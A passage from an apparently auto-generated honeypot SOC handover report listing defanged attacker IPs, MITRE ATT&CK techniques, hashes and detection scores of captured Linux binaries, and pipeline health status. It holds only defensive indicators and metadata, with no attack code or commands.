| `1.222.42[.]237` | 1 | 2026-06-02 16:30 | 2026-06-02 16:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.67[.]255` | 1 | 2026-06-02 16:23 | 2026-06-02 16:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.182.250[.]93` | 1 | 2026-06-02 14:15 | 2026-06-02 14:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-06-02 14:47 | 2026-06-02 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]202` | 1 | 2026-06-02 15:58 | 2026-06-02 15:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.100[.]52` | 1 | 2026-06-02 15:32 | 2026-06-02 15:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.181[.]42` | 1 | 2026-06-02 16:14 | 2026-06-02 16:14 | 5s | 0 | `T1592` | 🟢 LOW |
| `107.0.200[.]227` | 1 | 2026-06-02 16:35 | 2026-06-02 16:35 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `108.254.64[.]17` | 1 | 2026-06-02 15:59 | 2026-06-02 16:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.135.233[.]75` | 1 | 2026-06-02 15:53 | 2026-06-02 15:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.186.7[.]10` | 1 | 2026-06-02 15:28 | 2026-06-02 15:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-06-02 15:34 | 2026-06-02 15:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.154[.]88` | 1 | 2026-06-02 14:02 | 2026-06-02 14:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.33[.]21` | 1 | 2026-06-02 16:29 | 2026-06-02 16:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.21.59[.]218` | 1 | 2026-06-02 16:29 | 2026-06-02 16:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.94.106[.]195` | 1 | 2026-06-02 15:51 | 2026-06-02 15:52 | 48s | 0 | `T1592` | 🟢 LOW |
| `140.246.137[.]102` | 1 | 2026-06-02 16:32 | 2026-06-02 16:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.136.129[.]10` | 1 | 2026-06-02 15:30 | 2026-06-02 15:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.37[.]103` | 1 | 2026-06-02 11:46 | 2026-06-02 11:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-06-02 16:37 | 2026-06-02 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.43.235[.]75` | 1 | 2026-06-02 15:47 | 2026-06-02 15:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.240.59[.]59` | 1 | 2026-06-02 15:30 | 2026-06-02 15:30 | 9s | 0 | `T1592` | 🟢 LOW |
| `190.151.130[.]5` | 1 | 2026-06-02 16:30 | 2026-06-02 16:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.181.4[.]12` | 1 | 2026-06-02 16:30 | 2026-06-02 16:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.55.95[.]84` | 1 | 2026-06-02 11:55 | 2026-06-02 11:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `203.116.129[.]55` | 1 | 2026-06-02 16:07 | 2026-06-02 16:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.105.67[.]198` | 1 | 2026-06-02 13:14 | 2026-06-02 13:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.127.171[.]38` | 1 | 2026-06-02 11:44 | 2026-06-02 11:45 | 12s | 0 | `T1592` | 🟢 LOW |
| `222.127.52[.]229` | 1 | 2026-06-02 16:17 | 2026-06-02 16:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `36.255.220[.]145` | 1 | 2026-06-02 11:11 | 2026-06-02 11:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.242.115[.]84` | 1 | 2026-06-02 14:06 | 2026-06-02 14:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.152.20[.]33` | 1 | 2026-06-02 13:10 | 2026-06-02 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]43` | 1 | 2026-06-02 16:34 | 2026-06-02 16:35 | 15s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-06-02 15:23 | 2026-06-02 15:23 | 1s | 0 | `T1592` | 🟢 LOW |
| `8.154.2[.]19` | 1 | 2026-06-02 15:48 | 2026-06-02 15:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.140[.]11` | 1 | 2026-06-02 15:18 | 2026-06-02 15:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]15` | 1 | 2026-06-02 11:53 | 2026-06-02 11:53 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **24/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 38/100 | 🟢 LOW | **20/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.151.130[.]5` | GT | Corporacion de Internet, Sociedad Anonima. | **100** ⚠️ | 4 |
| `36.255.220[.]145` | HK | ZL HKG UCLOUD 0001 | **100** ⚠️ | 16 |
| `54.152.20[.]33` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `210.105.67[.]198` | KR | Korea Telecom | **100** ⚠️ | 42 |
| `108.254.64[.]17` | US | AT&T Enterprises, LLC | **100** ⚠️ | 17 |
| `115.190.251[.]242` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 17 |
| `66.132.195[.]79` | US | Censys, Inc. | **100** ⚠️ | 49 |
| `101.79.165[.]43` | HK | CDNetworks | **100** ⚠️ | 20 |
| `172.191.239[.]155` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `51.75.64[.]35` | DE | OVH GmbH | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 430 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 238 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 144 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 72 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 70 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 22 |
| AbuseIPDB score 3 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 576 cases |
| Tool 34  | Credential Extractor        | ✅ 382 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 72 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (5.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 142 priority case(s) shown individually · 58 recon entry/entries in table (21 group(s) consolidating 363 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-02T16:40:33Z_
